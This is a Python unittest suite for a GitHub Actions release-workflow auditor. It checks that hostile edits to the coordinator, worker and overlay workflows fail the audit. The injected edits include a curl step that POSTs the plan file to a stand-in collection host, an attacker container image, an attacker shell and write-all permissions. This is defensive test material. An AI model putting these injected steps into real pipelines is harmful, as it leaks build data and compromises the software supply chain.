from __future__ import annotations

import hashlib
from pathlib import Path
import tempfile
import unittest

from scripts.core_pipeline_lib.release.workflow_audit import (
    APPROVED_ACTION_REVISIONS,
    COORDINATOR_PATH,
    EXPECTED_WORKFLOW_SHA256,
    MAX_PARALLEL,
    OVERLAY_PATH,
    WORKER_PATH,
    audit_release_workflows,
)


REPOSITORY_ROOT = Path(__file__).resolve().parents[1]
COORDINATOR_WORKFLOW_BYTES = (REPOSITORY_ROOT / COORDINATOR_PATH).read_bytes()
WORKER_WORKFLOW_BYTES = (REPOSITORY_ROOT / WORKER_PATH).read_bytes()
OVERLAY_WORKFLOW_BYTES = (REPOSITORY_ROOT / OVERLAY_PATH).read_bytes()
COORDINATOR_WORKFLOW = COORDINATOR_WORKFLOW_BYTES.decode("utf-8")
WORKER_WORKFLOW = WORKER_WORKFLOW_BYTES.decode("utf-8")
OVERLAY_WORKFLOW = OVERLAY_WORKFLOW_BYTES.decode("utf-8")


def replace_once(text: str, old: str, new: str) -> str:
    if text.count(old) != 1:
        raise AssertionError(f"expected exactly one mutation anchor: {old!r}")
    return text.replace(old, new, 1)


class ReleaseWorkflowAuditTests(unittest.TestCase):
    def audit_texts(
        self,
        coordinator: str = COORDINATOR_WORKFLOW,
        worker: str = WORKER_WORKFLOW,
        overlay: str = OVERLAY_WORKFLOW,
    ) -> dict:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            workflow_root = root / ".github" / "workflows"
            workflow_root.mkdir(parents=True)
            (root / COORDINATOR_PATH).write_text(coordinator, encoding="utf-8")
            (root / WORKER_PATH).write_text(worker, encoding="utf-8")
            (root / OVERLAY_PATH).write_text(overlay, encoding="utf-8")
            return audit_release_workflows(root)

    def assert_invalid(
        self,
        *,
        coordinator: str = COORDINATOR_WORKFLOW,
        worker: str = WORKER_WORKFLOW,
        overlay: str = OVERLAY_WORKFLOW,
        error: str,
    ) -> None:
        report = self.audit_texts(coordinator, worker, overlay)
        self.assertEqual("invalid", report["status"])
        self.assertTrue(
            any(error in item for item in report["errors"]),
            f"missing {error!r} in {report['errors']!r}",
        )

    def assert_changed_contract_invalid(
        self,
        *,
        role: str,
        workflow: str,
    ) -> dict:
        originals = {
            "coordinator": COORDINATOR_WORKFLOW,
            "worker": WORKER_WORKFLOW,
            "overlay": OVERLAY_WORKFLOW,
        }
        original = originals[role]
        self.assertNotEqual(original, workflow)
        report = self.audit_texts(
            coordinator=workflow if role == "coordinator" else COORDINATOR_WORKFLOW,
            worker=workflow if role == "worker" else WORKER_WORKFLOW,
            overlay=workflow if role == "overlay" else OVERLAY_WORKFLOW,
        )
        self.assertEqual("invalid", report["status"])
        self.assertEqual("invalid", report[role]["status"])
        self.assertTrue(
            any(
                "workflow bytes differ from the reviewed canonical contract" in item
                for item in report["errors"]
            ),
            report["errors"],
        )
        return report

    def test_exact_publication_disabled_contract_is_valid(self) -> None:
        report = self.audit_texts()

        self.assertEqual("valid", report["status"])
        self.assertEqual("disabled", report["publication"])
        self.assertEqual([], report["errors"])
        self.assertEqual(
            {
                "workflow_count": 3,
                "valid_workflow_count": 3,
                "error_count": 0,
                "unique_reusable_workflow_count": 1,
                "max_parallel": 4,
            },
            report["summary"],
        )
        self.assertEqual(COORDINATOR_PATH.as_posix(), report["coordinator"]["path"])
        self.assertEqual(WORKER_PATH.as_posix(), report["worker"]["path"])
        self.assertEqual(OVERLAY_PATH.as_posix(), report["overlay"]["path"])
        self.assertEqual(
            hashlib.sha256(COORDINATOR_WORKFLOW_BYTES).hexdigest(),
            report["coordinator"]["file_sha256"],
        )
        self.assertEqual(
            hashlib.sha256(WORKER_WORKFLOW_BYTES).hexdigest(),
            report["worker"]["file_sha256"],
        )
        self.assertEqual(
            EXPECTED_WORKFLOW_SHA256["coordinator"],
            hashlib.sha256(COORDINATOR_WORKFLOW_BYTES).hexdigest(),
        )
        self.assertEqual(
            EXPECTED_WORKFLOW_SHA256["worker"],
            hashlib.sha256(WORKER_WORKFLOW_BYTES).hexdigest(),
        )
        self.assertEqual(
            EXPECTED_WORKFLOW_SHA256["overlay"],
            hashlib.sha256(OVERLAY_WORKFLOW_BYTES).hexdigest(),
        )

    def test_missing_symlink_nonregular_and_invalid_utf8_fail_closed(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            workflow_root = root / ".github" / "workflows"
            workflow_root.mkdir(parents=True)
            (root / WORKER_PATH).write_text(WORKER_WORKFLOW, encoding="utf-8")
            report = audit_release_workflows(root)
            self.assertIn("workflow path is missing", "\n".join(report["errors"]))

        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            workflow_root = root / ".github" / "workflows"
            workflow_root.mkdir(parents=True)
            target = root / "coordinator.yml"
            target.write_text(COORDINATOR_WORKFLOW, encoding="utf-8")
            (root / COORDINATOR_PATH).symlink_to(target)
            (root / WORKER_PATH).write_text(WORKER_WORKFLOW, encoding="utf-8")
            report = audit_release_workflows(root)
            self.assertIn("traverses a symlink", "\n".join(report["errors"]))

        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            workflow_root = root / ".github" / "workflows"
            workflow_root.mkdir(parents=True)
            (root / COORDINATOR_PATH).mkdir()
            (root / WORKER_PATH).write_text(WORKER_WORKFLOW, encoding="utf-8")
            report = audit_release_workflows(root)
            self.assertIn("regular file", "\n".join(report["errors"]))

        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            workflow_root = root / ".github" / "workflows"
            workflow_root.mkdir(parents=True)
            (root / COORDINATOR_PATH).write_bytes(b"\xff\xfe")
            (root / WORKER_PATH).write_text(WORKER_WORKFLOW, encoding="utf-8")
            report = audit_release_workflows(root)
            self.assertIn("valid UTF-8", "\n".join(report["errors"]))

    def test_unreviewed_executable_and_yaml_mutations_fail_closed(self) -> None:
        step_anchor = "    steps:\n"
        mutations = {
            "arbitrary-curl-step": replace_once(
                WORKER_WORKFLOW,
                step_anchor,
                step_anchor
                + "      - name: Send plan elsewhere\n"
                + "        run: >-\n"
                + "          curl -X POST --data-binary @\"$PLAN_PATH\" "
                + "https://example.invalid/collect\n\n",
            ),
            "arbitrary-gh-api-step": replace_once(
                WORKER_WORKFLOW,
                step_anchor,
                step_anchor
                + "      - name: Mutate through the GitHub API\n"
                + "        run: >-\n"
                + "          gh api --method POST repos/example/example/dispatches\n\n",
            ),
            "invalid-yaml": "broken: [\n" + WORKER_WORKFLOW,
        }

        for label, workflow in mutations.items():
            with self.subTest(label=label):
                self.assert_changed_contract_invalid(role="worker", workflow=workflow)

    def test_unreviewed_runner_job_and_step_controls_fail_closed(self) -> None:
        mutations = {
            "self-hosted": replace_once(
                WORKER_WORKFLOW,
                "    runs-on: ubuntu-latest",
                "    runs-on: self-hosted",
            ),
            "container": replace_once(
                WORKER_WORKFLOW,
                "    runs-on: ubuntu-latest\n",
                "    runs-on: ubuntu-latest\n"
                "    container: attacker/example:latest\n",
            ),
            "services": replace_once(
                WORKER_WORKFLOW,
                "    timeout-minutes: 90\n",
                "    timeout-minutes: 90\n"
                "    services:\n"
                "      attacker:\n"
                "        image: attacker/example:latest\n",
            ),
            "custom-shell": replace_once(
                WORKER_WORKFLOW,
                "      - name: Check plan membership and clean tracked state\n"
                "        run: |",
                "      - name: Check plan membership and clean tracked state\n"
                "        shell: \"attacker-shell {0}\"\n"
                "        run: |",
            ),
            "checkout-repository": replace_once(
                WORKER_WORKFLOW,
                "          persist-credentials: false\n",
                "          persist-credentials: false\n"
                "          repository: attacker/example\n",
            ),
        }

        for label, workflow in mutations.items():
            with self.subTest(label=label):
                self.assert_changed_contract_invalid(role="worker", workflow=workflow)

    def test_duplicate_permission_core_argument_and_action_revision_fail_closed(
        self,
    ) -> None:
        checkout = (
            "actions/checkout@"
            + APPROVED_ACTION_REVISIONS["actions/checkout"]
        )
        mutations = {
            "quoted-duplicate-permission": replace_once(
                WORKER_WORKFLOW,
                "permissions:\n  contents: read\n",
                "permissions:\n  contents: read\n\n"
                '"permissions": write-all\n',
            ),
            "core-argument-drift": replace_once(
                WORKER_WORKFLOW,
                '          --runner-profile github-actions\n'
                '          --core "$CORE_ID"\n'
                '          --group-tag "$GROUP_TAG"',
                '          --runner-profile github-actions\n'
                '          --core gambatte\n'
                '          --group-tag "$GROUP_TAG"',
            ),
            "zero-action-revision": replace_once(
                WORKER_WORKFLOW,
                checkout,
                "actions/checkout@" + "0" * 40,
            ),
        }

        for label, workflow in mutations.items():
            with self.subTest(label=label):
                report = self.assert_changed_contract_invalid(
                    role="worker", workflow=workflow
                )
                if label == "zero-action-revision":
                    self.assertTrue(
                        any(
                            "must use its exact reviewed revision" in item
                            for item in report["errors"]
                        ),
                        report["errors"],
                    )

    def test_unpinned_unapproved_write_publication_and_unsafe_contracts_fail(self) -> None:
        cases = {
            "unpinned": (
                COORDINATOR_WORKFLOW.replace(
                    "actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5",
                    "actions/checkout@v4",
                    1,
                ),
                "exact 40-character commit",
            ),
            "unapproved-action": (
                COORDINATOR_WORKFLOW.replace(
                    "actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5",
                    "example/unsafe@34e114876b0b11c390a56381ad16ebd13914f8d5",
                    1,
                ),
                "unapproved action",
            ),
            "write": (
                COORDINATOR_WORKFLOW.replace("contents: read", "contents: write"),
                "write permission",
            ),
            "publication": (
                COORDINATOR_WORKFLOW.replace(
                    "python3 scripts/core_pipeline.py seal-release",
                    "gh release upload candidate asset.zip\n"
                    "          python3 scripts/core_pipeline.py seal-release",
                ),
                "publication or deployment command",
            ),
            "expression-in-run": (
                COORDINATOR_WORKFLOW.replace(
                    '"$CANDIDATE_ID"', "${{ inputs.candidate_id }}", 1
                ),
                "run scripts must not interpolate Actions expressions",
            ),
            "automatic-trigger": (
                COORDINATOR_WORKFLOW.replace(
                    "  workflow_dispatch:\n", "  push:\n  workflow_dispatch:\n", 1
                ),
                "forbidden triggers",
            ),
        }
        for label, (coordinator, error) in cases.items():
            with self.subTest(label=label):
                self.assert_invalid(coordinator=coordinator, error=error)

    def test_coordinator_matrix_plan_seal_and_artifact_mutations_fail(self) -> None:
        cases = {
            "per-core-wrapper": (
                COORDINATOR_WORKFLOW.replace(
                    "./.github/workflows/_build-one-core.yml",
                    "./.github/workflows/build-handy.yml",
                ),
                "unapproved local reusable workflow",
            ),
            "fail-fast": (
                COORDINATOR_WORKFLOW.replace("fail-fast: false", "fail-fast: true"),
                "fail-fast: false",
            ),
            "parallel": (
                COORDINATOR_WORKFLOW.replace(
                    "max-parallel: 4", f"max-parallel: {MAX_PARALLEL + 1}"
                ),
                "max-parallel must be between",
            ),
            "matrix": (
                COORDINATOR_WORKFLOW.replace(
                    "fromJSON(needs.plan.outputs.matrix)",
                    "fromJSON(inputs.matrix)",
                ),
                "matrix must come exactly from the plan job",
            ),
            "plan": (
                COORDINATOR_WORKFLOW.replace("plan-release", "plan-other", 1),
                "plan-release exactly once",
            ),
            "matrix-command": (
                COORDINATOR_WORKFLOW.replace("release-matrix", "release-other", 1),
                "release-matrix exactly once",
            ),
            "seal-runner": (
                COORDINATOR_WORKFLOW.replace(
                    "--runner-profile github-actions",
                    "--runner-profile github-actions-sim",
                ),
                "native github-actions runner",
            ),
            "flatten-results": (
                COORDINATOR_WORKFLOW.replace(
                    "merge-multiple: true", "merge-multiple: false"
                ),
                "result fan-in layout",
            ),
            "hidden": (
                COORDINATOR_WORKFLOW.replace(
                    "include-hidden-files: true", "include-hidden-files: false", 1
                ),
                "must include hidden files",
            ),
            "group-default": (
                COORDINATOR_WORKFLOW.replace(
                    "default: main-stable:universal",
                    "default: edge-test:a523",
                ),
                "group_tag input",
            ),
        }
        for label, (coordinator, error) in cases.items():
            with self.subTest(label=label):
                self.assert_invalid(coordinator=coordinator, error=error)

    def test_worker_input_toolchain_build_result_and_diagnostic_mutations_fail(self) -> None:
        cases = {
            "input": (
                WORKER_WORKFLOW.replace("      core_id:\n", "      wrong_core_id:\n", 1),
                "workflow inputs must be exactly",
            ),
            "toolchain-root": (
                WORKER_WORKFLOW.replace("$RUNNER_TEMP/core-toolchains", "."),
                "staged below RUNNER_TEMP",
            ),
            "build-runner": (
                WORKER_WORKFLOW.replace(
                    "--runner-profile github-actions",
                    "--runner-profile github-actions-sim",
                ),
                "native github-actions runner",
            ),
            "record": (
                WORKER_WORKFLOW.replace(
                    "record-release-result", "record-other", 1
                ),
                "record-release-result exactly once",
            ),
            "flatten-result": (
                WORKER_WORKFLOW.replace(
                    "path: ${{ env.RESULT_PARENT }}/",
                    "path: ${{ env.RESULT_PARENT }}/${{ inputs.core_id }}/",
                ),
                "top-level core directory",
            ),
            "hidden": (
                WORKER_WORKFLOW.replace(
                    "include-hidden-files: true", "include-hidden-files: false", 1
                ),
                "must include hidden files",
            ),
            "diagnostic-condition": (
                WORKER_WORKFLOW.replace("if: ${{ always() }}", "if: ${{ success() }}"),
                "always() is allowed only",
            ),
            "diagnostic-ignore": (
                WORKER_WORKFLOW.replace(
                    "if-no-files-found: ignore", "if-no-files-found: error"
                ),
                "diagnostic artifact exception",
            ),
        }
        for label, (worker, error) in cases.items():
            with self.subTest(label=label):
                self.assert_invalid(worker=worker, error=error)

    def test_source_graph_preparation_is_required_before_every_release_stage(
        self,
    ) -> None:
        cases = (
            (
                "coordinator-plan",
                "coordinator",
                COORDINATOR_WORKFLOW.replace(
                    "          python3 scripts/core_pipeline.py prepare-release-source-graph\n"
                    "          --group-tag \"$GROUP_TAG\"\n\n",
                    "",
                    1,
                ),
            ),
            (
                "coordinator-seal",
                "coordinator",
                COORDINATOR_WORKFLOW.replace(
                    "          python3 scripts/core_pipeline.py prepare-release-source-graph\n"
                    "          --group-tag \"$GROUP_TAG\"\n\n",
                    "",
                    1,
                ).replace(
                    "          python3 scripts/core_pipeline.py prepare-release-source-graph\n"
                    "          --group-tag \"$GROUP_TAG\"\n\n",
                    "",
                    1,
                ),
            ),
            (
                "worker",
                "worker",
                WORKER_WORKFLOW.replace(
                    "          python3 scripts/core_pipeline.py prepare-release-source-graph\n"
                    "          --group-tag \"$GROUP_TAG\"\n"
                    "          --core \"$CORE_ID\"\n\n",
                    "",
                    1,
                ),
            ),
            (
                "worker-unscoped",
                "worker",
                WORKER_WORKFLOW.replace(
                    "          --core \"$CORE_ID\"\n",
                    "",
                    1,
                ),
            ),
            (
                "worker-unbound-core",
                "worker",
                WORKER_WORKFLOW.replace(
                    "            '.cores | any(.core_id == $core)' \"$PLAN_PATH\" >/dev/null\n",
                    "",
                    1,
                ),
            ),
        )
        for label, role, workflow in cases:
            with self.subTest(label=label):
                report = self.assert_changed_contract_invalid(
                    role=role, workflow=workflow
                )
                self.assertTrue(
                    any("source graph" in error for error in report["errors"]),
                    report["errors"],
                )

    def test_overlay_run_head_attempt_and_exact_artifact_are_fail_closed(self) -> None:
        mutations = {
            "floating-run": OVERLAY_WORKFLOW.replace(
                '"repos/$GITHUB_REPOSITORY/actions/runs/$REQUESTED_RUN_ID"',
                '"repos/$GITHUB_REPOSITORY/actions/runs/latest"',
            ),
            "wrong-workflow": OVERLAY_WORKFLOW.replace(
                '.path == ".github/workflows/release-candidate.yml"',
                '.path == ".github/workflows/other.yml"',
            ),
            "current-head": OVERLAY_WORKFLOW.replace(
                "          ref: ${{ steps.run.outputs.head_sha }}\n", ""
            ),
            "dispatch-workflow-head-not-bound": OVERLAY_WORKFLOW.replace(
                '          if [ "$GITHUB_SHA" != "$head_sha" ]; then\n'
                '            echo "overlay workflow commit must equal coordinator head" >&2\n'
                "            exit 1\n"
                "          fi\n",
                "",
            ),
            "wildcard-artifact": OVERLAY_WORKFLOW.replace(
                "          name: release-candidate-${{ steps.run.outputs.run_id }}-"
                "${{ steps.run.outputs.run_attempt }}",
                "          pattern: release-candidate-*",
            ),
            "standalone-converter": OVERLAY_WORKFLOW.replace(
                "python3 scripts/core_pipeline.py convert-release-overlay",
                "python3 scripts/release_overlay.py",
            ),
            "no-source-graph": OVERLAY_WORKFLOW.replace(
                "          python3 scripts/core_pipeline.py prepare-release-source-graph \\\n"
                "            --group-tag \"$group_tag\"\n\n",
                "",
            ),
        }
        for label, workflow in mutations.items():
            with self.subTest(label=label):
                report = self.assert_changed_contract_invalid(
                    role="overlay", workflow=workflow
                )
                self.assertEqual("invalid", report["overlay"]["status"])

    def test_malformed_contract_and_non_path_root_return_reports(self) -> None:
        report = self.audit_texts("not: the reviewed workflow\n", "also: invalid\n")
        self.assertEqual("invalid", report["status"])
        self.assertGreater(report["summary"]["error_count"], 0)
        self.assertEqual(3, report["summary"]["workflow_count"])

        wrong_root = audit_release_workflows("not-a-path")  # type: ignore[arg-type]
        self.assertEqual("invalid", wrong_root["status"])
        self.assertEqual(3, wrong_root["summary"]["error_count"])


if __name__ == "__main__":
    unittest.main()
